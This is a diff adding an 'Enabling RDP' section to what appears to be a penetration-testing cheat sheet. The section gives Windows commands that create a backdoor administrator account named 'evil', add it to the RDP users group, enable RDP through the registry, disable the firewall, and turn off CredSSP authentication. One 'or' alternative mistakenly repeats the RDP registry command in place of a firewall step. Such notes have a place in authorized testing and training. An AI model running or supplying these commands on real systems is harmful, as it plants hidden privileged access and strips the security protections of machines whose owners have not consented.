@@ -300,7 +300,29 @@ Dual home:
  
      WinRM quickconfig       
  
-Enable RDP
+### Enabling RDP  
+Add a user with RDP / admin privs 
+
+    net user evil 3v1lPass /add
+    net localgroup Administrators evil /add
+    net localgroup "Remote Desktop Users" evil /ADD
+
+Enable RDP 
+
+    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+Turn firewall off
+
+    netsh firewall set opmode disable
+    or
+    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+If you get this error:
+"ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized ?
+Failed to connect, CredSSP required by server.""
+Add this reg key:
+
+    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
 
 
 ## Transferring Files
